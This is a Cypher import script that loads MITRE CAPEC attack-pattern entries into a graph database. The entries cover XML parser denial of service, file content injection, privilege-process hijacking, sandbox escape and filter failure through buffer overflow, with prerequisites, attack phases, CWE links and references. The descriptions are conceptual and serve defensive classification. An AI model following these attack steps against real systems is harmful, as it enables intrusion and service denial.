CREATE (:ResourcesRequired{id: 122, text: "<div level=\"0\">\n  <p class=\"text\">An attacker will need tools to sniff existing credentials (possibly their own) in order to retrieve a base credential for modification. They will need to understand how the components of the credential affect server behavior and how to manipulate this behavior by changing the credential. Finally, they will need tools to allow them to craft and transmit a modified credential.</p>\n</div>"});
CREATE (:AttackPattern{id: 227, name: "Sustained Client Engagement", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 184, text: "<div level=\"0\">\n  <p class=\"text\">This pattern of attack requires a temporal aspect to the servicing of a given request. Success can be achieved if the adversary can make requests that collectively take more time to complete than legitimate user requests within the same time frame.</p>\n</div>"});
CREATE (:Submission{id: 207});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 207, summary: "OrderedDict([('Text', \"An adversary attempts to deny legitimate users access to a resource by continually engaging a specific resource in an attempt to keep the resource tied up as long as possible. The adversary's primary goal is not to crash or flood the target, which would alert defenders; rather it is to repeatedly perform actions or abuse algorithmic flaws such that a given resource is tied up and not available to a legitimate user. By carefully crafting a requests that keep the resource engaged through what is seemingly benign requests, legitimate users are limited or completely denied access to the resource. The degree to which the attack is successful depends upon the adversary's ability to sustain resource requests over time with a volume that exceeds the normal usage by legitimate users, as well as other mitigating circumstances such as the target's ability to shift load or acquire additional resources to deal with the depletion. This attack differs from a flooding attack as it is not entirely dependent upon large volumes of requests, and it differs from resource leak exposures which tend to exploit the surrounding environment needed for the resource to function. The key factor in a sustainment attack are the repeated requests that take longer to process than usual.\")])"});
CREATE (:ResourcesRequired{id: 123, text: "<div level=\"0\">\n  <p class=\"text\">To successfully execute this pattern of attack, a script or program is often required that is capable of continually engaging the target and maintaining sustained usage of a specific resource. Depending on the configuration of the target, it may or may not be necessary to involve a network or cluster of objects all capable of making parallel requests.</p>\n</div>"});
CREATE (:AttackPattern{id: 228, name: "DTD Injection", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 185, text: "<div level=\"0\">\n  <p class=\"text\">The target must be running an XML based application that leverages DTDs.</p>\n</div>"});
CREATE (:Submission{id: 208});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 208, summary: "OrderedDict([('Text', \"An attacker injects malicious content into an application's DTD in an attempt to produce a negative technical impact. DTDs are used to describe how XML documents are processed. Certain malformed DTDs (for example, those with excessive entity expansion as described in CAPEC 197) can cause the XML parsers that process the DTDs to consume excessive resources resulting in resource depletion.\")])"});
MERGE (:Reference{local_id: "R.228.1", author: "Ryan Naraine", title: "DoS Flaw in SOAP DTD Parameter", publisher: "ITBusiness Edge, Quinstreet Inc.", pubdate: "December 15, 2003", link: "http://www.internetnews.com/dev-news/article.php/3289191"});
MERGE (:CWE{id: 100});
CREATE (:AttackPattern{id: 229, name: "XML Attribute Blowup", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 186, text: "<div level=\"0\">\n  <p class=\"text\">The server accepts XML input and is using a parser with a runtime longer than O(n) for the insertion of a new attribute in the data container.(examples are .NET framework 1.0 and 1.1)</p>\n</div>"});
CREATE (:Submission{id: 209});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 209, summary: "OrderedDict([('Text', 'This attack exploits certain XML parsers which manage data in an inefficient manner. The attacker crafts an XML document with many attributes in the same XML node. In a vulnerable parser, this results in a denial of service condition where CPU resources are exhausted because of the parsing algorithm.')])"});
MERGE (:CWE{id: 770});
CREATE (:AttackPattern{id: 23, name: "File Content Injection", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 187, text: "<div level=\"0\">\n  <p class=\"text\">The target software must consume files.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 188, text: "<div level=\"0\">\n  <p class=\"text\">The attacker must have access to modify files that the target software will consume.</p>\n</div>"});
CREATE (:Submission{id: 210});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 168});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:PreviousEntryName{id: 48, name: "File System Function Injection, Content Based"});
MERGE (:Date{date: "2015-12-07"});
CREATE (:Description{id: 210, summary: "OrderedDict([('Text', \"An attack of this type exploits the host's trust in executing remote content including binary files. The files are poisoned with a malicious payload (targeting the file systems accessible by the target software) by the attacker and may be passed through standard channels such as via email, and standard web content like PDF and multimedia files. The attacker exploits known vulnerabilities or handling routines in the target processes. Vulnerabilities of this type have been found in a wide variety of commercial applications from Microsoft Office to Adobe Acrobat and Apple Safari web browser. When the attacker knows the standard handling routines and can identify vulnerabilities and entry points they can be exploited by otherwise seemingly normal content. Once the attack is executed, the attackers' program can access relative directories such as C:\\\\Program Files or other standard system directories to launch further attacks. In a worst case scenario, these programs are combined with other propagation logic and work as a virus.\")])"});
MERGE (:Reference{id: "REF-2", local_id: "R.23.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-42", local_id: "R.23.2", title: "The OWASP Guide Project", section: "File System", publisher: "The Open Web Application Security Project (OWASP)", link: "http://www.owasp.org/index.php/File_System"});
MERGE (:CWE{id: 77});
MERGE (:CWE{id: 23});
MERGE (:CWE{id: 22});
MERGE (:CWE{id: 713});
MERGE (:CWE{id: 715});
CREATE (:AttackPattern{id: 230, name: "XML Nested Payloads", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 189, text: "<div level=\"0\">\n  <p class=\"text\">An application uses an XML parser to perform transformation on user-controllable data.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 190, text: "<div level=\"0\">\n  <p class=\"text\">An application does not perform sufficient validation to ensure that user-controllable data is safe for an XML parser.</p>\n</div>"});
CREATE (:Submission{id: 211});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 211, summary: "OrderedDict([('Text', \"Applications often need to transform data in and out of the XML format by using an XML parser. It may be possible for an attacker to inject data that may have an adverse effect on the XML parser when it is being processed. By nesting XML data and causing this data to be continuously self-referential, an attacker can cause the XML parser to consume more resources while processing, causing excessive memory consumption and CPU utilization. An attacker's goal is to leverage parser failure to his or her advantage. In most cases this type of an attack will result in a denial of service due to an application becoming unstable, freezing, or crash. However it may be possible to cause a crash resulting in arbitrary code execution, leading to a jump from the data plane to the control plane [R.230.1].\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker determines the input data stream that is being processed by an XML parser on the victim's side.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker crafts input data that may have an adverse effect on the operation of the XML parser when the data is parsed on the victim's system.</p>\n</div>"});
MERGE (:Reference{id: "REF-43", local_id: "R.230.1", author: "Shlomo, Yona", title: "XML Parser Attacks: A summary of ways to attack an XML Parser", section: "What is an XML Parser Attack?", pubdate: "2007", link: "http://yeda.cs.technion.ac.il/~yona/talks/xml_parser_attacks/slides/slide2.html"});
MERGE (:CWE{id: 112});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 19});
MERGE (:CWE{id: 674});
MERGE (:CWE{id: 770});
CREATE (:AttackPattern{id: 231, name: "XML Oversized Payloads", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 191, text: "<div level=\"0\">\n  <p class=\"text\">An application uses an XML parser to perform transformation on user-controllable data.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 192, text: "<div level=\"0\">\n  <p class=\"text\">An application does not perform sufficient validation to ensure that user-controllable data is safe for an XML parser.</p>\n</div>"});
CREATE (:Submission{id: 212});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 212, summary: "OrderedDict([('Text', \"Applications often need to transform data in and out of the XML format by using an XML parser. It may be possible for an attacker to inject data that may have an adverse effect on the XML parser when it is being processed. By supplying oversized payloads in input vectors that will be processed by the XML parser, an attacker can cause the XML parser to consume more resources while processing, causing excessive memory consumption and CPU utilization, and potentially cause execution of arbitrary code. An attacker's goal is to leverage parser failure to his or her advantage. In many cases this type of an attack will result in a denial of service due to an application becoming unstable, freezing, or crash. However it is possible to cause a crash resulting in arbitrary code execution, leading to a jump from the data plane to the control plane [R.231.1].\")])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker determines the input data stream that is being processed by an XML parser on the victim's side.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">An attacker crafts input data that may have an adverse effect on the operation of the XML parser when the data is parsed on the victim's system.</p>\n</div>"});
MERGE (:Reference{id: "REF-43", local_id: "R.231.1", author: "Shlomo, Yona", title: "XML Parser Attacks: A summary of ways to attack an XML Parser", section: "What is an XML Parser Attack?", pubdate: "2007", link: "http://yeda.cs.technion.ac.il/~yona/talks/xml_parser_attacks/slides/slide2.html"});
MERGE (:CWE{id: 112});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 19});
MERGE (:CWE{id: 674});
MERGE (:CWE{id: 770});
CREATE (:AttackPattern{id: 233, name: "Privilege Escalation", status: "Draft", pattern_abstraction: "Meta", pattern_completeness: "Stub"});
CREATE (:Submission{id: 213});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 169});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Description, Description Summary, Relationships, Type (Category -> Attack_Pattern)"});
CREATE (:Description{id: 213, summary: "OrderedDict([('Text', 'An adversary exploits a weakness enabling them to elevate their privilege and perform an action that they are not supposed to be authorized to perform.')])"});
CREATE (:AttackPattern{id: 234, name: "Hijacking a privileged process", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Stub"});
CREATE (:AttackPrerequisite{id: 193, text: "<div level=\"0\">\n  <p class=\"text\">The targeted process or operating system must contain a bug that allows attackers to hijack the targeted process.</p>\n</div>"});
CREATE (:Submission{id: 214});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 170});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 214, summary: "OrderedDict([('Text', 'An attacker gains control of a process that is assigned elevated privileges in order to execute arbitrary code with those privileges. Some processes are assigned elevated privileges on an operating system, usually through association with a particular user, group, or role. If an attacker can hijack this process, they will be able to assume its level of privilege in order to execute their own code. Processes can be hijacked through improper handling of user input (for example, a buffer overflow or certain types of injection attacks) or by utilizing system utilities that support process control that have been inadequately secured.')])"});
CREATE (:CVE{id: "CVE-2008-1363", description: "<div level=\"0\">\n  <p class=\"text\">VMware Workstation 6.0.x before 6.0.3 and 5.5.x before 5.5.6, VMware Player 2.0.x before 2.0.3 and 1.0.x before 1.0.6, VMware ACE 2.0.x before 2.0.1 and 1.0.x before 1.0.5, and VMware Server 1.0.x before 1.0.5 on Windows allow local users to gain privileges via an unspecified manipulation of a config.ini file located in an Application Data folder, which can be used for \"hijacking the VMX process.\"</p>\n</div>"});
CREATE (:CVE{id: "CVE-2007-6705", description: "<div level=\"0\">\n  <p class=\"text\">The WebSphere MQ XA 5.3 before FP13 and 6.0.x before 6.0.2.1 client for Windows, when running in an MTS or a COM+ environment, grants the PROCESS_DUP_HANDLE privilege to the Everyone group upon connection to a queue manager, which allows local users to duplicate an arbitrary handle and possibly hijack an arbitrary process.</p>\n</div>"});
MERGE (:CWE{id: 732});
MERGE (:CWE{id: 648});
CREATE (:ResourcesRequired{id: 125, text: "<div level=\"0\">\n  <p class=\"text\">No special resources are required.</p>\n</div>"});
CREATE (:AttackPattern{id: 235, name: "Implementing a callback to system routine (old AWT Queue)", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Hook"});
CREATE (:Submission{id: 215});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 171});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:AttackPattern{id: 236, name: "Catching exception throw/signal from privileged block", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 194, text: "<div level=\"0\">\n  <p class=\"text\">The application in question employs a threaded model of execution with the threads operating at, or having the ability to switch to, a higher privilege level than normal users</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 195, text: "<div level=\"0\">\n  <p class=\"text\">In order to feasibly execute this class of attacks, the attacker must have the ability to hijack a privileged thread.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 196, text: "<div level=\"0\">\n  <p class=\"text\">This ability includes, but is not limited to, modifying environment variables that affect the process the thread belongs to, or providing malformed user-controllable input that causes the executing thread to fault and return to a higher privilege level or such.</p>\n</div>"});
CREATE (:AttackPrerequisite{id: 197, text: "<div level=\"0\">\n  <p class=\"text\">This does not preclude network-based attacks, but makes them conceptually more difficult to identify and execute.</p>\n</div>"});
CREATE (:Submission{id: 216});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 172});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 215, summary: "OrderedDict([('Text', ['Attackers can sometimes hijack a privileged thread from the underlying system through synchronous (calling a privileged function that returns incorrectly) or asynchronous (callbacks, signal handlers, and similar) means.', \"Having done so, the Attacker may not only likely access functionality the system's designer didn't intend for them, but they may also go undetected or deny other users essential service in a catastrophic (or insidiously subtle) way.\"])])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Attacker determines the underlying system thread that is subject to user-control</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Attacker then provides input, perhaps by way of environment variables for the process in question, that affect the executing thread</p>\n</div>"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Upon successful hijacking, the attacker enjoys elevated privileges, and can possibly have the hijacked thread do his bidding</p>\n</div>"});
MERGE (:CWE{id: 270});
CREATE (:ResourcesRequired{id: 126, text: "<div level=\"0\">\n  <p class=\"text\">The attacker needs to be able to latch onto a privileged thread. No special hardware or software tool-based resources are required.</p>\n  <p class=\"text\">The Attacker does, however, need to be able to program, compile, and link to the victim binaries being executed so that it will turn control of a privileged thread over to the Attacker's malicious code. This is the case even if the attacker conducts the attack remotely.</p>\n</div>"});
CREATE (:AttackPattern{id: 237, name: "Calling Signed Code From Another Language Within A Sandbox Allow This ", status: "Draft", pattern_abstraction: "Standard", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 198, text: "<div level=\"0\">\n  <p class=\"text\">A framework-based language that supports code signing and sandbox (such as Java, .Net, JavaScript, and Flash) Deployed code that has been signed by its authoring vendor, or a partner</p>\n</div>"});
CREATE (:Submission{id: 217});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Description{id: 216, summary: "OrderedDict([('Text', 'The attacker may submit a malicious signed code from another language to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox. For instance, Java code cannot perform unsafe operations, such as modifying arbitrary memory locations, due to restrictions placed on it by the Byte code Verifier and the JVM. If allowed, Java code can call directly into native C code, which may perform unsafe operations, such as call system calls and modify arbitrary memory locations on their behave. To provide isolation, Java does not grant untrusted code with unmediated access to native C code. Instead, the sandboxed code is typically allowed to call some subset of the pre-existing native code that is part of standard libraries.')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Probing", description: "<div level=\"0\">\n  <p class=\"text\">The attacker probes the target application to see whether calling signed code from another language is allowed within a sandbox.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker probes the target application to see whether calling signed code from another language is allowed within a sandbox.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The target application allows calling signed code from another language within a sandbox.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker knows that the target application is calling signed code from another language within a sandbox."});
CREATE (:AttackStep{id: 2, title: "Analysis", description: "<div level=\"0\">\n  <p class=\"text\">The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker analyzes the target application to get a list of cross code weaknesses in the standard libraries of the sandbox.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">The standard library of the sandbox has some cross code security weaknesses.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker gets a list of cross code security weaknesses in the standard libraries."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Verify the exploitable security weaknesses", description: "<div level=\"0\">\n  <p class=\"text\">The attacker tries to craft malicious signed code from another language allowed by the sandbox to verify the security weaknesses of the standard libraries found in the Explore phase.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker tries to explore the security weaknesses by calling malicious signed code from another language allowed by the sandbox.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker identifies a list exploitable security weaknesses in the standard libraries."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Exploit the security weaknesses in the standard libraries", description: "<div level=\"0\">\n  <p class=\"text\">The attacker calls signed malicious code from another language to exploit the security weaknesses in the standard libraries verified in the Experiment phase. The attacker will be able to obtain access to privileges that were not intentionally exposed by the sandbox, thus escaping the sandbox.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">The attacker calls signed malicious code from another language to exploit the security weaknesses in the standard libraries.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "The attacker escapes the sandbox to obtain access to privileges that were not intentionally exposed by the sandbox."});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
MERGE (:Reference{local_id: "R.237.1", author: "['J. Cappos', 'J. Rasley', 'J. Samuel', 'I. Beschastnikh', 'C. Barsan', 'A. Krishnamurthy', 'T. Anderson']", title: "Retaining Sandbox Containment Despite Bugs in Privileged Memory-Safe Code", pubdate: "2010"});
MERGE (:Reference{local_id: "R.237.2", title: "Malware Protection Center: Threat Research and Response", section: "Exploit: Java/ByteVerify.C", publisher: "Microsoft Corporation", pubdate: "2007", link: "http://www.microsoft.com/security/portal/Threat/Encyclopedia/Entry.aspx?Name=Exploit%3AJava%2FByteVerify.C"});
MERGE (:CWE{id: 693});
CREATE (:ResourcesRequired{id: 127, text: "<div level=\"0\">\n  <p class=\"text\">No special resource is required.</p>\n</div>"});
CREATE (:AttackPattern{id: 238, name: "Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Hook"});
CREATE (:Submission{id: 218});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:AttackPattern{id: 239, name: "Subversion of authorization checks: cache filtering, programmatic security, etc.", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Hook"});
CREATE (:Submission{id: 219});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 173});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:AttackPattern{id: 24, name: "Filter Failure through Buffer Overflow", status: "Draft", pattern_abstraction: "Detailed", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 199, text: "<div level=\"0\">\n  <p class=\"text\">Ability to control the length of data passed to an active filter.</p>\n</div>"});
CREATE (:Submission{id: 220});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 174});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-01-09"});
MERGE (:Comment{comment: "Updated Related_Attack_Patterns"});
CREATE (:Description{id: 217, summary: "OrderedDict([('Text', 'In this attack, the idea is to cause an active filter to fail by causing an oversized transaction. An attacker may try to feed overly long input strings to the program in an attempt to overwhelm the filter (by causing a buffer overflow) and hoping that the filter does not fail securely (i.e. the user input is let into the system unfiltered).')])"});
CREATE (:AttackPhase{id: 1, name: "Explore"});
CREATE (:AttackStep{id: 1, title: "Survey", description: "<div level=\"0\">\n  <p class=\"text\">The attacker surveys the target application, possibly as a valid and authenticated user</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Spidering web sites for inputs that involve potential filtering</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Brute force guessing of filtered inputs</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Software messages (e.g., \"the following characters are not allowed...\") indicate that filtered inputs are present in the software. (</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Application uses predefined inputs (e.g., drop-down lists, radio buttons, selection lists, etc.)</p>\n</div>"});
CREATE (:Indicator{id: 3, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Managed code (e.g., .NET, Java) is likely, based on URLs.</p>\n</div>"});
CREATE (:Indicator{id: 4, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Managed code (e.g., .NET, Java) is likely, based on files found in software.</p>\n</div>"});
CREATE (:Indicator{id: 5, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Java code is likely, based on standard disclaimers (e.g., \"This software contains Java from Sun....\"). Such declarations are frequent on commercial software that is based on Java.</p>\n</div>"});
CREATE (:Indicator{id: 6, type: "Inconclusive", description: "<div level=\"0\">\n  <p class=\"text\">Java code is likely, based on one of the other indicators, but it could contain Java Native Interface (JNI) code. This is indicated by the inclusion of DLLs or equivalent binary object code with Java code.</p>\n</div>"});
CREATE (:AttackPhase{id: 2, name: "Experiment"});
CREATE (:AttackStep{id: 1, title: "Attempt injections", description: "<div level=\"0\">\n  <p class=\"text\">Try to feed overly long data to the system. This can be done manually or a dynamic tool (black box) can be used to automate this. An attacker can also use a custom script for that purpose.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Brute force attack through black box penetration test tool.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Fuzzing of communications protocols</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">Manual testing of possible inputs with attack data.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Unexpected output from the application."});
CREATE (:Outcome{id: 2, type: "Failure", description: "No unexpected output from the application."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Corrective"});
CREATE (:AttackStep{id: 2, title: "Monitor responses", description: "<div level=\"0\">\n  <p class=\"text\">Watch for any indication of failure occurring. Carefully watch to see what happened when filter failure occurred. Did the data get in?</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">Boron tagging. Choose clear attack inputs that are easy to notice in output. In binary this is often 0xa5a5a5a5 (alternating 1s and 0s). Another obvious tag value is all zeroes, but it is not always obvious what goes wrong if the null values get into the data.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Check Log files. An attacker with access to log files can look at the outcome of bad input.</p>\n</div>"});
CREATE (:SecurityControl{id: 1, type: "Preventative"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:AttackPhase{id: 3, name: "Exploit"});
CREATE (:AttackStep{id: 1, title: "Abuse the system through filter failure", description: "<div level=\"0\">\n  <p class=\"text\">An attacker writes a script to consistently induce the filter failure.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 1, description: "<div level=\"0\">\n  <p class=\"text\">DoS through filter failure. The attacker causes the system to crash or stay down because of its failure to filter properly.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 2, description: "<div level=\"0\">\n  <p class=\"text\">Malicious code execution. An attacker introduces a malicious payload and executes arbitrary code on the target system.</p>\n</div>"});
CREATE (:AttackStepTechnique{id: 3, description: "<div level=\"0\">\n  <p class=\"text\">An attacker can use the filter failure to introduce malicious data into the system and leverage a subsequent SQL injection, Cross Site Scripting, Command Injection or similar weakness if it exists.</p>\n</div>"});
CREATE (:Indicator{id: 1, type: "Positive", description: "<div level=\"0\">\n  <p class=\"text\">Failure mode of the software (perhaps as a safety mechanism) includes exiting or ceasing to respond.</p>\n</div>"});
CREATE (:Indicator{id: 2, type: "Negative", description: "<div level=\"0\">\n  <p class=\"text\">Failures do not involve stopping services, rejecting inputs or connections, and do not affect other simultaneous users of the software.</p>\n</div>"});
CREATE (:Outcome{id: 1, type: "Success", description: "Attacker-supplied code is executed on the target system."});
CREATE (:Outcome{id: 2, type: "Success", description: "The software stops responding for at least two orders of magnitude longer than the input takes to send. (e.g., 0.1s to send input induces at least a 10 second period non-responsiveness)."});
CREATE (:Outcome{id: 3, type: "Success", description: "Non-response by an attacker's input has an impact on the quality of service of other simultaneous users of the software."});
CREATE (:SecurityControl{id: 1, type: "Detective"});
CREATE (:SecurityControl{id: 2, type: "Preventative"});
CREATE (:SecurityControl{id: 3, type: "Preventative"});
MERGE (:Reference{id: "REF-2", local_id: "R.24.1", author: "['G. Hoglund', 'G. McGraw']", title: "Exploiting Software: How to Break Code", publisher: "Addison-Wesley", pubdate: "February 2004"});
MERGE (:Reference{id: "REF-3", local_id: "R.24.2", title: "Common Weakness Enumeration (CWE)", section: "CWE-119: Buffer Errors", publisher: "The MITRE Corporation", pubdate: "2007", link: "http://cwe.mitre.org/data/definitions/119.html"});
MERGE (:CWE{id: 120});
MERGE (:CWE{id: 119});
MERGE (:CWE{id: 118});
MERGE (:CWE{id: 74});
MERGE (:CWE{id: 20});
MERGE (:CWE{id: 680});
MERGE (:CWE{id: 733});
MERGE (:CWE{id: 697});
CREATE (:AttackPattern{id: 240, name: "Resource Injection", status: "Stable", pattern_abstraction: "Meta", pattern_completeness: "Complete"});
CREATE (:AttackPrerequisite{id: 200, text: "<div level=\"0\">\n  <p class=\"text\">The target application allows the user to both specify the identifier used to access a system resource. Through this permission, the user gains the capability to perform actions on that resource (e.g., overwrite the file)</p>\n</div>"});
CREATE (:Submission{id: 221});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Organization{name: "The MITRE Corporation"});
MERGE (:Date{date: "2014-06-23"});
CREATE (:Modification{id: 175});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2015-12-07"});
MERGE (:Comment{comment: "Updated Description, Description Summary"});
CREATE (:Modification{id: 176});
MERGE (:Person{name: "CAPEC Content Team"});
MERGE (:Date{date: "2017-05-01"});
MERGE (:Comment{comment: "Updated Attack_Motivation-Consequences, Attack_Prerequisites, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity"});
CREATE (:Description{id: 218, summary: "OrderedDict([('Text', 'An adversary exploits weaknesses in input validation by manipulating resource identifiers enabling the unintended modification or specification of a resource.')])"});
MERGE (:CWE{id: 99});
